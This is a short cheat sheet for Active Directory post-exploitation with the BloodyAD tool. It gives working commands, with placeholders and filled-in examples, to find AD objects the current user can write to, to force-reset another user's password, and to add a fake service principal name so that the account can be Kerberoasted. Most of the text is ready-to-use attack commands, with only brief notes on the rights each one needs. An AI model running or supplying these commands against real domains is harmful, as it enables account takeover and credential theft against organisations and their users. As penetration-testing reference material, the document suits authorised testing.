# Active Directory Post-Exploitation Cheat Sheet

---

# BloodyAD - Find Writable Objects

## Purpose
Enumerate all AD objects the current user can modify.

### Requirements
- [ ] Valid domain credentials
- [ ] Network connectivity to the Domain Controller
- [ ] BloodAD installed

### Command

```bash
bloodyad --host <DC_IP_OR_HOSTNAME> \
-d <DOMAIN> \
-u <USERNAME> \
-p '<PASSWORD>' \
get writable --detail
```

### Notes

Useful for finding:

- GenericWrite
- GenericAll
- WriteOwner
- WriteDACL
- WriteSPN
- ForceChangePassword
- AddMember
- etc.

This is usually one of the first commands to run after obtaining domain credentials.

---

# BloodyAD - Change Another User's Password

## Purpose

Reset another user's password without knowing the old one.

### Requirements

- [ ] You have **ForceChangePassword** over the target user
- [ ] OR you have **GenericAll**
- [ ] OR you have sufficient rights that include password reset
- [ ] Valid domain credentials

### Command

```bash
bloodyad --host <DC_IP_OR_HOSTNAME> \
-d <DOMAIN> \
-u <USERNAME> \
-p '<PASSWORD>' \
set password <TARGET_USER> '<NEW_PASSWORD>'
```

### Example

```bash
bloodyad --host <DC_IP> \
-d example.local \
-u alice \
-p 'Password123!' \
set password bob 'NewPassword123!'
```

### Result

You can now authenticate as the target user using the new password.

---

# BloodyAD - Add / Modify Service Principal Name (SPN)

## Purpose

Add a fake SPN to a user account in order to perform Kerberoasting.

### Requirements

- [ ] GenericWrite over the target user
- [ ] OR GenericAll
- [ ] OR WriteProperty on servicePrincipalName
- [ ] Valid domain credentials

### Command

```bash
bloodyad --host <DC_HOSTNAME> \
-d <DOMAIN> \
-u <USERNAME> \
-p '<PASSWORD>' \
set object <TARGET_USER> servicePrincipalName -v '<FAKE/SPN>'
```

### Example

```bash
bloodyad --host dc01.example.local \
-d example.local \
-u alice \
-p 'Password123!' \
set object bob servicePrincipalName -v 'fake/http'
```

### Why?

If the target user doesn't already have an SPN, adding one allows Kerberoasting.

---
